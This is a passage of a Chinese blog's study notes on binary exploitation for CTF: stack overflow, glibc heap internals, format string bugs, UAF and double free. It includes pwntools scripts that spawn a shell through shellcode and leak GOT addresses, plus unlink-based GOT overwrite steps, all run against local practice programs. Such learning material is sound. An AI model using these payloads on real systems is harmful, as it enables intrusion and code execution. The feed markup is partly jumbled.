/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -z execstack a.c</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527012540397.png" alt="image-20230527012540397"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ret_addr = <span class="number">0xffffcc68</span> <span class="comment"># ebp = 0xffffcc58</span></span><br><span class="line">shellcode = shellcraft.i386.sh()</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span></span><br><span class="line">payload += p32(ret_addr)</span><br><span class="line">payload += <span class="string">&quot;\x90&quot;</span> * <span class="number">20</span></span><br><span class="line">payload += asm(shellcode)</span><br><span class="line">payload += <span class="string">&quot;C&quot;</span> * <span class="number">169</span> <span class="comment"># 24 + 4 + 20 + 44 + 169 = 261</span></span><br></pre></td></tr></table></figure><p>根本没明白….这个shellcode 是咋写出来的。我是直无语了</p><h1 id="堆溢出漏洞基本原理"><a href="#堆溢出漏洞基本原理" class="headerlink" title="堆溢出漏洞基本原理"></a>堆溢出漏洞基本原理</h1><p>​    堆（chunk)内存是一种允许程序在运行过程中动态分配和使用的内存区城。相比于栈内存和全局内存，堆内存<strong>没有</strong>固定的生命周期和围定的内存区域，程序可以动态地申请和释放不同大小的内在。被分配后，如果没有进行明确的释放操作，该堆内存区域都是一直有效的。</p><p>堆是程序虚拟内存中由低地址向高地址增长的线性区域。一般只有当用户向操作系统申请内存时，这片区域才会被内核分配出来，并且出于效率和页对齐的考虑，通常会分配相当大的连续内存。程序再次申请时便会从这片内存中分配，直到堆空间不能满足时才会再次增长。堆的位置一般在BSS段高地址处。</p><p>为了进行高效的堆内存分配、回收和管理，Glibc实现了Ptmalloc2的 堆管理器。主要介绍Ptmalloc2堆管理器缺陷的分析和利用。只介绍Glibc 2.25版本最基本的结构和概念，以及2.26版本的加入新特性，具体堆管理器的实现请读者根据Ptmalloc2源代码进行深入了解。</p><h2 id="堆概述"><a href="#堆概述" class="headerlink" title="堆概述"></a>堆概述</h2><p>堆一直以来都是pwn的一个分水岭，你在CTF走多远就取决于你堆玩的有多6</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">heap #查看堆块</span><br><span class="line">bin #查看bin区块</span><br><span class="line">p &amp;__free_hook #查看某个函数的真实地址</span><br><span class="line">p *__free_hook #查看某个函数的指向</span><br><span class="line">x/xxgx 0xxxx #查看某个地址的内存</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>其实堆你就可以看成一个结构体数组，然后数组里每个元素都会开辟一块内存来存储数据</p><p>那么这块用来存储数据的内存就是堆。</p><p>结构体数组在BSS段上，其内容就是堆的地址，也就是堆的指针。</p><p>总的来说，就是划分为了2部分，管理区块和数据存放区块，存放区块就是堆，管理区块可以对堆增删改查</p><h2 id="题型划分"><a href="#题型划分" class="headerlink" title="题型划分"></a>题型划分</h2><p>off by one</p><p>off by null</p><p>堆溢出</p><p>UAF</p><p>double free</p><h2 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h2><p>其实无论什么题型，最后都是为了在管理区块上有多个指针指向同一个堆，最后的效果都是如此的</p><h2 id="堆大小的计算方法"><a href="#堆大小的计算方法" class="headerlink" title="堆大小的计算方法"></a>堆大小的计算方法</h2><p>min：最小值为0x20 你申请的再小都好 他都会划分为0x20</p><p>堆块大小的计算方式:你申请一个0x20的你会得到0x30 0x28的也是会得到0x30 他会自动进1位</p><h2 id="bin的划分"><a href="#bin的划分" class="headerlink" title="bin的划分"></a>bin的划分</h2><p>bin管理区块是管理被free后的堆的，是可以被我们利用的</p><p>tcache bins: 0-0x420大小 被free后的堆会进入这 填满7个后就不会再往里面填 寻址方式靠fd指针</p><p>large bin: 寻址方式靠fd bk指针 双向链表</p><p>small bin :寻址方式靠fd bk指针 双向链表</p><p>fast bin: 0~0x90寻址方式靠fd 指针 单链表</p><p>unsorted bin:寻址方式靠fd bk指针 双向链表</p><h2 id="从bin取堆的优先度"><a href="#从bin取堆的优先度" class="headerlink" title="从bin取堆的优先度"></a>从bin取堆的优先度</h2><p>tcache机制在Ubuntu18及以上才有，如果tcache里面有则优先从tcache里面取，如果没有就去对应大小的bin里面取，还是没有才去unsorted bin里面切割。</p><h2 id="堆的字段讲解"><a href="#堆的字段讲解" class="headerlink" title="堆的字段讲解"></a>堆的字段讲解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x602000</span><br><span class="line">0x602000: prev_size size</span><br><span class="line">0x602010: fd bk</span><br><span class="line">0x602020: fd_next bk_next</span><br><span class="line">0x602030: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>在堆没被释放的时候堆的有效字段为size，size以下都是我们的content也就是我们可以写入的内容，大小根据程序来申请的size来决定</p><p>我们前面提到了一点堆的size的问题，为什么是取16的整数倍是因为哪怕最小的一个chunk他需要的字段都要包含</p><p>prev_size size</p><p>fd bk</p><p>fd_next bk_next是large bin 和small bin 才有的</p><h2 id="size字段讲解"><a href="#size字段讲解" class="headerlink" title="size字段讲解"></a>size字段讲解</h2><p>关于size字段他又存在一个insure标志位我们申请的正常的堆在gdb看见的size字段结尾都是1例如0x91</p><p>这个insure位是用来记录这个堆前面的堆是否被释放，这里简单提下off by null的利用假设我的堆本来是</p><p>0x111大小的然后前面的堆是没被释放的，但是因为这个漏洞的关系导致了我0x111大小被修改为0x100</p><p>那么此时程序就误认为我们前面的堆被释放了，我们再去释放这个0x100的堆，前面的堆就会因为合并规则</p><p>和这个堆一起被丢进bins里面，但是我们的管理区块是没有删除他们的地址的，所以当我们再去申请的时候</p><p>就会造成管理区块有多个地址指向同一个堆可以造成堆复用进而导致getshell。</p><h2 id="fd-bk-prev-size的讲解"><a href="#fd-bk-prev-size的讲解" class="headerlink" title="fd bk prev_size的讲解"></a>fd bk prev_size的讲解</h2><p>prev_size记录的是前一个堆块的大小 是只有当前一个堆块被free的时候才会出现的，这个的初衷是用来防止用户串改被释放后的堆块的大小的但是我们依然各种漏洞绕过。</p><p>fd，bk指针是当chunk进入到bin里面会被启用的字段，此时他们就是有效的指针，我们可以修改指针达到任意地址申请的效果</p><h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><h2 id="格式化字符串漏洞基本原理"><a href="#格式化字符串漏洞基本原理" class="headerlink" title="格式化字符串漏洞基本原理"></a>格式化字符串漏洞基本原理</h2><p>C语言中常用的格式化输出函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fprintf</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span>)</span></span><br></pre></td></tr></table></figure><p>两种用法类似，在C语言种，printf的常规用法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%S\n&quot;</span>,<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number:%d\n&quot;</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>其中，函数第一个参数带有%d、%s等占位符的字符串被称为格式化字符串，占位符用于指明输出的参数值如何格式化。</p><p>占位符的语法为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flag][field width][.precision][length]type</span><br></pre></td></tr></table></figure><p>parameter可以忽略或者为**n$**，n表示此占位符是传入的第几个参数。</p><p>flags可为0个或多个，主要包括：</p><ul><li>+—总是表示有符号数值的’+’或’-‘，默认忽略正数的符号，仅适用于数值类型。</li><li>空格—有符号数的输出如果没有正负号或者输出0个字符，则以1个空格作为前缀。</li><li>-—左对齐，默认是右对齐。</li><li>＃—对于’g’与’G’，不删除尾部0以表示精度对于’f’、’F’、’e’、’E’、’g’、’G’，总是输出小数点；对于’o’、’x’、’X’，在非0数值前分别输出前缀0、0x和0X，表示数制。</li><li>0—在宽度选项前，表示用0填充</li></ul><p>field width给出显示数值的最小宽度，用于输出时填充固定宽度。实际输出字符的个数不足域宽时，根据左对齐或右对齐进行填充，负号解释为左对齐标志。如果域宽设置为“*”，则由对应的函数参数的值为当前域宽。</p><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong></p><p>常见的有格式化字符串函数有：</p><ul><li>输入：<ul><li>scanf</li></ul></li><li>输出<ul><li><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528133013753.png" alt="image-20230528133013753"></li></ul></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>只需要输入很多个%s就可</p><p>%s%s%s%s%s%s%s%s%s%s%s%s%s%s</p><p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。</p><h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528134648560.png" alt="image-20230528134648560"></p><p>发现当输入%08x.%08x.%08x的时候就不对咯</p><p>gdb调试，下断点在printf处，然后运行输入：%08x.%08x.%08x</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528135837332.png" alt="image-20230528135837332"></p><p>可以看出，此时此时已经进入了 printf 函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序，断在了第二个printf处：</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528135933469.png" alt="image-20230528135933469"></p><p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd94 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528135957703.png" alt="image-20230528135957703"></p><p>果然输出了栈中的内容</p><p><strong>需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，直接获取栈中被视为第</strong> <strong>n+1</strong> <strong>个参数的值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**%n$x**</span><br></pre></td></tr></table></figure><p>为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。</p><p>继续调试：</p><p>输入%3$x</p><p>我们确实获得了 printf 的第 4 个参数</p><h3 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h3><p>调试输入%s</p><p><strong>tips</strong></p><ul><li><p>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</p></li><li><p>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</p></li><li><p>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</p></li></ul><h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中s 是 main 函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个数的值其实就是该格式化字符串的地址。</p><p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure><p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[tag]%p%p%p%p%p%p...</span><br></pre></td></tr></table></figure><p>输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。</p><p>通过传入got表地址，程序就会把got真实地址打印出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">leakmemory = ELF(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">__isoc99_scanf_got = leakmemory.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(__isoc99_scanf_got)</span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">&#x27;%4$s&#x27;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;%4$s\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(u32(sh.recv()[<span class="number">4</span>:<span class="number">8</span>])) <span class="comment"># remove the first bytes of __isoc99_scanf@got</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="UAF和Double-Free的利用原理"><a href="#UAF和Double-Free的利用原理" class="headerlink" title="UAF和Double Free的利用原理"></a>UAF和Double Free的利用原理</h1><p>c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *p1;</span><br><span class="line">    p1 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">10</span>);<span class="comment">//申请内存空间</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;hello&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1 addr:%x,%s\n&quot;</span>,p1,p1);</span><br><span class="line">    <span class="built_in">free</span>(p1);<span class="comment">//释放内存空间</span></span><br><span class="line">    <span class="type">char</span> *p2;</span><br><span class="line">    p2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">10</span>);<span class="comment">//二次申请内存空间，与第一次大小相同，申请到了同一块内存</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;world&quot;</span>,<span class="number">10</span>);<span class="comment">//对内存进行修改</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p2 addr:%x,%s\n&quot;</span>,p2,p1);<span class="comment">//验证</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码所示</p><p>1.指针p1申请内存，打印其地址值</p><p>2.然后释放p1</p><p>3.指针p2申请同样大小的内存，打印p2的地址，p1指针指向的值</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528140649816.png" alt="image-20230528140649816"></p><p>p1与p2地址相同，p1指针释放后，p2申请相同的大小的内存，操作系统会将之前给p1的地址分配给</p><p>p2，修改p2的值，p1也被修改了。</p><p><strong>根本原因</strong></p><p>应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放回内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，</p><p>dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p><p><strong>简单讲</strong>就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p><h2 id="linxu堆漏洞之Double-free"><a href="#linxu堆漏洞之Double-free" class="headerlink" title="linxu堆漏洞之Double free"></a>linxu堆漏洞之Double free</h2><h3 id="Double-free-同一个指针指向的内存被free2次"><a href="#Double-free-同一个指针指向的内存被free2次" class="headerlink" title="Double free:同一个指针指向的内存被free2次"></a>Double free:同一个指针指向的内存被free2次</h3><h3 id="Glibc背景知识"><a href="#Glibc背景知识" class="headerlink" title="Glibc背景知识"></a>Glibc背景知识</h3><p>Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块的显式链表（Glibc中的bins数据结构）。关于bins的介绍已经有很多，就不赘述了。接下来介绍一下Linux下Double free漏洞原理以及free函数的堆块合并过程。</p><p>Double free漏洞原理： free函数在释放堆块时，会通过隐式链表判断相邻前、后堆块是否为空闲堆块；如果堆块为空闲就会进行合并，然后利用Unlink机制将该空闲堆块从Unsorted bin中取下。如果用户精心构造的假堆块被Unlink，很容易导致一次固定地址写，然后转换为任意地址读写，从而控制程序的执行。</p><p>Linux free函数原理</p><p>由堆块头部形成的隐式链表可知，一个需释放堆块相邻的堆块有两个：前一个块（由当前块头指针加pre_size确定），后一个块（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：向后合并、向前合并。当前一个块和当前块合并时，叫做向后合并。当后一个块和当前块合并时，叫做向前合并。</p><p>malloc.c int_free函数中相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line">(((mchunkptr)(((<span class="type">char</span> \*) (p)) + (s)))-&gt;size&amp; PREV_INUSE)</span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* consolidate backward \*/</span> <span class="comment">// &quot;向后合并&quot;</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//如果前一个块为空闲，则进行合并</span></span><br><span class="line">prevsize = p-&gt;prev_size; <span class="comment">//获得前一个块大小</span></span><br><span class="line">size += prevsize; <span class="comment">//合并后堆块大小</span></span><br><span class="line">p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize)); <span class="comment">//根据当前块指针和前一个块大小，确定前一个块位置，即合并后块位置</span></span><br><span class="line">unlink(av, p, bck, fwd); <span class="comment">//利用unlink从显式链表Unsorted</span></span><br><span class="line">bin取下前一个块</span><br><span class="line">&#125;</span><br><span class="line">nextchunk = chunk_at_offset(p, size); <span class="comment">//根据当前块指针和当前块大小， 确定后一个块位置，</span></span><br><span class="line">nextsize = chunksize(nextchunk); <span class="comment">//获得后一个块大小</span></span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">//根据下一个块的下一个块的PREV_INUSE位，判断下一个块是否空闲</span></span><br><span class="line"><span class="comment">/* consolidate forward \*/</span> <span class="comment">// &quot;向前合并&quot;</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果后一个块为空闲，则进行合并</span></span><br><span class="line">unlink(av, nextchunk, bck, fwd); <span class="comment">//使用unlink将后一个块从unsorted</span></span><br><span class="line">bin中取下</span><br><span class="line">size += nextsize; <span class="comment">//扩大当前块大小即可完成向前合并</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>//由于unlink的危险性，添加了一些检测机制，完整版unlink宏如下</p><p>/* Take a chunk off a bin list */</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Double-free漏洞利用原理"><a href="#Double-free漏洞利用原理" class="headerlink" title="Double free漏洞利用原理"></a>Double free漏洞利用原理</h3><p>以64位应用为例：如果在free一个指针指向的块时，由于堆溢出，将后一个块的块头改成如下格式：</p><ul><li>fake_prevsize1 = 被释放块大小；</li><li>fake_size1 = 0x20 | 1 (fake_size1 = 0x20)</li><li>fake_fd = <a href="mailto:&#102;&#x72;&#x65;&#x65;&#64;&#x67;&#111;&#x74;&#46;&#112;&#x6c;&#x74;">&#102;&#x72;&#x65;&#x65;&#64;&#x67;&#111;&#x74;&#46;&#112;&#x6c;&#x74;</a> - 0x18 </li><li>fake_bk = shellcode address</li><li>fake_prevsize2 = 0x20</li><li>fake_size2 = 0x10</li></ul><p>如果chunk0被释放(fake_size1 = 0x21)，进行空闲块合并时，1）由于前一个块非空闲，不会向后合并。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。如果chunk1被释放(fake_size1 = 0x20)，进行空闲块合并时，1）由于前一个块空闲，向后合并,导致unlink。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。根据unlink宏知道， 前一个块 FD 指向 <a href="mailto:&#x66;&#114;&#x65;&#101;&#64;&#x67;&#111;&#116;&#46;&#x70;&#x6c;&#116;">&#x66;&#114;&#x65;&#101;&#64;&#x67;&#111;&#116;&#46;&#x70;&#x6c;&#116;</a> - 0x18, 后一个块 BK 指向 shellcode address。然后前一个块 FD 的bk指针即<a href="mailto:&#x66;&#114;&#x65;&#101;&#x40;&#x67;&#111;&#x74;&#x2e;&#x70;&#x6c;&#x74;">&#x66;&#114;&#x65;&#101;&#x40;&#x67;&#111;&#x74;&#x2e;&#x70;&#x6c;&#x74;</a>，值为shellcode address, 后一个块 BK 的 fd 指针即shellcode+ 0x10，值为 <a href="mailto:&#102;&#x72;&#101;&#x65;&#x40;&#103;&#x6f;&#116;&#x2e;&#x70;&#x6c;&#x74;">&#102;&#x72;&#101;&#x65;&#x40;&#103;&#x6f;&#116;&#x2e;&#x70;&#x6c;&#x74;</a>。从而实现了一次固定地址写。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528162811484.png" alt="image-20230528145046242"></p><p>但是，由于当前glibc的加固检测机制，会检查显式链表中前一个块的fd与后一个块的bk是否都指向当前需要unlink的块。这样攻击者就无法替换chunk1(或chunk0)的fd与bk。相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(__builtin_expect(FD-&gt;bk!=P||BK-&gt;fd!=P,<span class="number">0</span>))</span><br><span class="line">malloc_printerr(check_action,<span class="string">&quot;corrupteddouble-linkedlist&quot;</span>,P,AV)</span><br></pre></td></tr></table></figure><p>针对这种情况，需要在内存中找到一个指向需要unlink块的指针，就可以绕过。</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="栈溢出漏洞基本原理"><a href="#栈溢出漏洞基本原理" class="headerlink" title="栈溢出漏洞基本原理"></a>栈溢出漏洞基本原理</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><p>栈溢出是缓冲区溢出的一种</p><p>缓冲区溢出是：一种长数据向小的缓冲区复制，导致数据超出了小缓冲区，导致其他的数据被破坏。这就是缓冲区溢出。</p><p><strong>手法</strong></p><p>1.先决条件，栈局部变量可控制，存在溢出（strcpy）</p><p>2.通过栈空间的布置，布置shellcode，并使用shellcode起始地址来覆盖栈帧的ret addr【返回地址】</p><p>3.Payload = [Nop sled + ] Shellcode + Pad + Shellcode’s Addr</p><p>但是：Shellcode地址在不同PC上不确定</p><p><strong>来看一个有问题的代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vul_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!(fp = fopen(<span class="string">&quot;input.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fread(buf,<span class="number">1024</span>,<span class="number">1</span>,fp);</span><br><span 